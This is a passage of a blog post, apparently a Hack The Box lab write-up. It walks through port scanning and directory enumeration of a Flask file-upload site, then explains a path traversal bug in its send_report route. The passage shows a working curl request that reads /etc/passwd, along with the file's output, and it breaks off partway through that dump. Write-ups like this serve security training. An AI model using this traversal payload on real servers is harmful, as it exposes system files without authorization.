@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta
+    name="description"
+    content=""
+  />
+  
+    
+      <title>OpenSource - HTB Writeup | Supaaasuge&#39;s Blog</title>
+    
+  
+  <link rel="stylesheet" href="/css/reset.css"/>
+  <link rel="stylesheet" href="/css/font.css"/>
+  <link rel="stylesheet" href="/css/smigle.css"/>
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+
+  <body>
+    <div id="root">
+      <header>
+  <div id="brand">
+    <a class="icon-link" href="https://supaaasuge.github.io/">
+      <img
+        class="icon"
+        src="/images/brandIcon.svg"
+      />
+    </a>
+    <div class="text">
+      <a href="https://supaaasuge.github.io/"><h1>Supaaasuge&#39;s Blog</h1></a>
+      <h3>Aspiring IT/Cybersecurity Professional</h3>
+    </div>
+  </div>
+  <nav>
+    
+      
+        
+        <a href="/"><b>Home</b></a>
+      
+         | 
+        <a href="/about/"><b>About</b></a>
+      
+         | 
+        <a href="/posts/"><b>Posts</b></a>
+      
+         | 
+        <a href="/categories/"><b>Categories</b></a>
+      
+         | 
+        <a href="/tags/"><b>Tags</b></a>
+      
+         | 
+        <a href="/index.xml"><b>RSS</b></a>
+      
+    
+  </nav>
+  <hr />
+</header>
+
+      <div id="content">
+        
+  <main>
+    <article>
+      <h1 class="title">OpenSource - HTB Writeup</h1>
+      
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2024-05-04</time>
+    <span>in</span>
+    
+      <a href="/categories/hack-the-box">Hack The Box</a>
+  </strong>
+  <span> • 1676 words</span>
+  <span> • 8 minute read</span>
+  
+  
+    <div>
+      <span>Tags:</span>
+      
+        <a href="/tags/flask">Flask</a>
+    </div>
+  
+</div>
+
+      <div class="content"><h1 id="opensource---htb-writeup">OpenSource - HTB Writeup</h1>
+<p><strong>Difficulty: Medium</strong></p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Starting off, I ran a full port scan to find open ports:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --min-rate <span style="color:#ae81ff">10000</span> -Pn $IP -oG p-.scan
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>$ cat p-.scan
+</span></span><span style="display:flex;"><span>Host: 10.129.227.140 <span style="color:#f92672">()</span>	Status: Up
+</span></span><span style="display:flex;"><span>Host: 10.129.227.140 <span style="color:#f92672">()</span>	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Mon May  6 17:30:07 2024 -- 1 IP address (1 host up) scanned in 81.90 seconds</span>
+</span></span></code></pre></div><p>Ports: <code>22</code>, <code>80</code>. Moving on to a TCP + service version scan with operating system detection:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,80 -O -sCVT -Pn $IP
+</span></span><span style="display:flex;"><span>cat scvto.scan 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94SVN scan initiated Mon May  6 17:32:59 2024 as: nmap -p22,80 -sCVT -O -Pn -oN scvto.scan 10.129.227.140</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.140
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.31s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Werkzeug/2.1.2 Python/3.10.3
+</span></span><span style="display:flex;"><span>|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   GetRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>|     Server: Werkzeug/2.1.2 Python/3.10.3
+</span></span><span style="display:flex;"><span>|     Date: Mon, <span style="color:#ae81ff">06</span> May <span style="color:#ae81ff">2024</span> 21:33:07 GMT
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">5316</span>
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;upcloud - Upload files <span style="color:#66d9ef">for</span> Free!&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/jquery/jquery-3.4.1.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/popper/popper.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/bootstrap/js/bootstrap.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/js/ie10-viewport-bug-workaround.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/bootstrap/css/bootstrap.css&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34; /static/vendor/bootstrap/css/bootstrap-grid.css&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34; /static/vendor/bootstrap/css/bootstrap-reboot.css&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   HTTPOptions: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>|     Server: Werkzeug/2.1.2 Python/3.10.3
+</span></span><span style="display:flex;"><span>|     Date: Mon, <span style="color:#ae81ff">06</span> May <span style="color:#ae81ff">2024</span> 21:33:07 GMT
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Allow: HEAD, OPTIONS, GET
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|   RTSPRequest: 
+</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD HTML 4.01//EN&#34;</span>
+</span></span><span style="display:flex;"><span>|     <span style="color:#e6db74">&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html;charset=utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;Error response&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;body&gt;
+</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Error response&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;Error code: 400&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;Message: Bad request version <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;RTSP/1.0&#39;</span><span style="color:#f92672">)</span>.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/body&gt;
+</span></span><span style="display:flex;"><span>|_    &lt;/html&gt;
+</span></span><span style="display:flex;"><span>|_http-title: upcloud - Upload files <span style="color:#66d9ef">for</span> Free!
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port80-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>5/6%Time<span style="color:#f92672">=</span>66394C93%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>Ge
+</span></span><span style="display:flex;"><span>SF:tRequest,1573,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0Python/3\.10\.3\r\nDate:\x20Mon,\x2006\x20May\x202024\x2021:33:07\x20G
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:MT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:205316\r\nConnection:\x20close\r\n\r\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20&lt;meta\x20charset=\&#34;UTF-8\&#34;&gt;\n\x20\x20\x20\x20&lt;meta\x20nam
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:e=\&#34;viewport\&#34;\x20content=\&#34;width=device-width,\x20initial-scale=1\.0\&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&gt;\n\x20\x20\x20\x20&lt;title&gt;upcloud\x20-\x20Upload\x20files\x20for\x20Fre
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:e!&lt;/title&gt;\n\n\x20\x20\x20\x20&lt;script\x20src=\&#34;/static/vendor/jquery/jq
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:uery-3\.4\.1\.min\.js\&#34;&gt;&lt;/script&gt;\n\x20\x20\x20\x20&lt;script\x20src=\&#34;/st
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:atic/vendor/popper/popper\.min\.js\&#34;&gt;&lt;/script&gt;\n\n\x20\x20\x20\x20&lt;scri
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:pt\x20src=\&#34;/static/vendor/bootstrap/js/bootstrap\.min\.js\&#34;&gt;&lt;/script&gt;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:n\x20\x20\x20\x20&lt;script\x20src=\&#34;/static/js/ie10-viewport-bug-workarou
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:nd\.js\&#34;&gt;&lt;/script&gt;\n\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20hr
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ef=\&#34;/static/vendor/bootstrap/css/bootstrap\.css\&#34;/&gt;\n\x20\x20\x20\x20&lt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;\x20/static/vendor/bootstrap/css/b
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ootstrap-grid\.css\&#34;/&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:href=\&#34;\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\&#34;/&gt;\n\n\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20&lt;link\x20rel=&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,C7,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:r\nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Mon,\x200
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:6\x20May\x202024\x2021:33:07\x20GMT\r\nContent-Type:\x20text/html;\x20c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:harset=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS,\x20GET\r\nContent-Length:\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:200\r\nConnection:\x20close\r\n\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,1F4,<span style="color:#e6db74">&#34;&lt;!DOCTYPE\x20H
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:TML\x20PUBLIC\x20\&#34;-//W3C//DTD\x20HTML\x204\.01//EN\&#34;\n\x20\x20\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\&#34;http://www\.w3\.org/TR/html4/strict\.dtd\&#34;&gt;\n&lt;html&gt;\n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-e
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:quiv=\&#34;Content-Type\&#34;\x20content=\&#34;text/html;charset=utf-8\&#34;&gt;\n\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&gt;Error\x20response&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20co
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:de:\x20400&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:equest\x20version\x20\(&#39;RTSP/1\.0&#39;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20&lt;p&gt;Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Linux 5.0 <span style="color:#f92672">(</span>96%<span style="color:#f92672">)</span>, Linux 4.15 - 5.8 <span style="color:#f92672">(</span>96%<span style="color:#f92672">)</span>, Linux 5.3 - 5.4 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 2.6.32 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 5.0 - 5.5 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.1 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.2 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, AXIS 210A or <span style="color:#ae81ff">211</span> Network Camera <span style="color:#f92672">(</span>Linux 2.6.17<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, ASUS RT-N56U WAP <span style="color:#f92672">(</span>Linux 3.4<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.16 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Mon May  6 17:35:05 2024 -- 1 IP address (1 host up) scanned in 125.59 seconds</span>
+</span></span></code></pre></div><p>From this, we can see that it&rsquo;s a Ubuntu Bionic 18.04 host based off of the SSH version, running a flask site (<code>Wekzeug/2.1.2 Python/3.10.3</code>) on port 80.</p>
+<p>Moving on to the website on port 80&hellip;. It&rsquo;s a basic site for <code>upcloud</code>, where you ca upload files for storage. The only other endpoint is <code>/upcloud</code>, where you can upload files file storage. When uploading a file, it will simply upload it to the <code>/upload</code> folder.</p>
+<p>You are also able to download the site&rsquo;s source code&hellip; So I went ahead and downloaded that and unzipped it. While it was downloading, we finally got a result from running <code>gobuster</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.129.227.140/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">123</span> / <span style="color:#ae81ff">220561</span> <span style="color:#f92672">(</span>0.06%<span style="color:#f92672">)[</span>ERROR<span style="color:#f92672">]</span> context deadline exceeded <span style="color:#f92672">(</span>Client.Timeout or context cancellation <span style="color:#66d9ef">while</span> reading body<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>/console              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1563<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">10082</span> / <span style="color:#ae81ff">220561</span> <span style="color:#f92672">(</span>4.57%<span style="color:#f92672">)</span>^C
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Keyboard interrupt detected, terminating.
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">10085</span> / <span style="color:#ae81ff">220561</span> <span style="color:#f92672">(</span>4.57%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><p>This endpoint gives us access to the Flask debug console, I will leave this for now although if I had to guess, this is likely our means of getting a foothold because the Flask debug console allows the ability to run system commands from it&rsquo;s console.</p>
+<p>Now going through the contents downloaded&hellip;</p>
+<p><img src="/posts/opensource-htb-1.png" alt="alt text"></p>
+<p>We can easily see that this is a git repository. Checking the logs:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git log --oneline
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Make sure to clean up the dockerfile <span style="color:#66d9ef">for</span> production use.
+</span></span></code></pre></div><p>This tells us that there is likely sensitive information disclosure somewhere.</p>
+<p>Checking all the branches from the repo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git branch -a
+</span></span></code></pre></div><h3 id="vulnerability">Vulnerability</h3>
+<p>In <code>views.py</code>. There is a function for handling uploads and serving them to the user called <code>send_report</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/uploads/&lt;path:path&gt;&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_report</span>(path):
+</span></span><span style="display:flex;"><span>  path <span style="color:#f92672">=</span> get_file_name(path)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> send_file(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#39;public&#39;</span>, <span style="color:#e6db74">&#39;uploads&#39;</span>, path))
+</span></span></code></pre></div><p>This function allows for path traversal. To showcase how this works I&rsquo;ll start a standard python interpreter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~ 
+</span></span><span style="display:flex;"><span>❯ python -q
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; import os
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;supaaasuge&#34;</span>
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; vuln_path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/spaaasuge&#34;</span>
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; os.path.join<span style="color:#f92672">(</span>os.getcwd<span style="color:#f92672">()</span>, <span style="color:#e6db74">&#39;public&#39;</span>, path<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;/home/supaaa/public/supaaasuge&#39;</span>
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; os.path.join<span style="color:#f92672">(</span>os.getcwd<span style="color:#f92672">()</span>, <span style="color:#e6db74">&#39;public&#39;</span>, vuln_path<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;/spaaasuge&#39;</span>
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; 
+</span></span></code></pre></div><p>This is a bit unexpected however here is the docoumentation that goes over this in more detail: <a href="https://docs.python.org/3.10/library/os.path.html#os.path.join">Docs</a></p>
+<p>As you can see, by prepending the filename with <code>/</code> this then becomes the absolute path.</p>
+<p>To exploit this I tried sending:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --path-as-is http://10.129.227.140/uploads//etc/passwd
+</span></span><span style="display:flex;"><span>&lt;!doctype html&gt;
+</span></span><span style="display:flex;"><span>&lt;html lang<span style="color:#f92672">=</span>en&gt;
+</span></span><span style="display:flex;"><span>&lt;title&gt;Redirecting...&lt;/title&gt;
+</span></span><span style="display:flex;"><span>&lt;h1&gt;Redirecting...&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://10.129.227.140/uploads/etc/passwd&#34;</span>&gt;http://10.129.227.140/uploads/etc/passwd&lt;/a&gt;. If not, click the link.
+</span></span></code></pre></div><p>This does not work&hellip; odd. After trying some different stuff, I found that to make this work you have to send <code>../</code> prepended to the path name. I am not exactly sure why this is honestly, but it works so I&rsquo;m not gonna lose any sleep over it know what I&rsquo;m sayin?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --path-as-is http://10.129.227.140/uploads/..//etc/passwd
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/ash
+</span></span><span style="display:flex;"><span>bin:x:1:1:bin:/bin:/sbin/nologin
+</span></span><span style="display:flex;"><span>daemon:x:2:2:daemon:/sbin:/sbin/nologin
+</span></span><span style="display:flex;"><span>adm:x:3:4:adm:/var/adm:/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:5:0:sync:/sbin:/bin/sync
+</span></span><span style="display:flex;"><span>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+</span></span><span style="display:flex;"><span>halt:x:7:0:halt:/sbin:/sbin/halt
+</span></span><span style="display:flex;"><span>mail:x:8:12:mail:/var/mail:/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:13:news:/usr/lib/news:/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+</span></span><span style="display:flex;"><span>operator:x:11:0:operator:/root:/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:13:15:man:/usr/man:/sbin/nologin
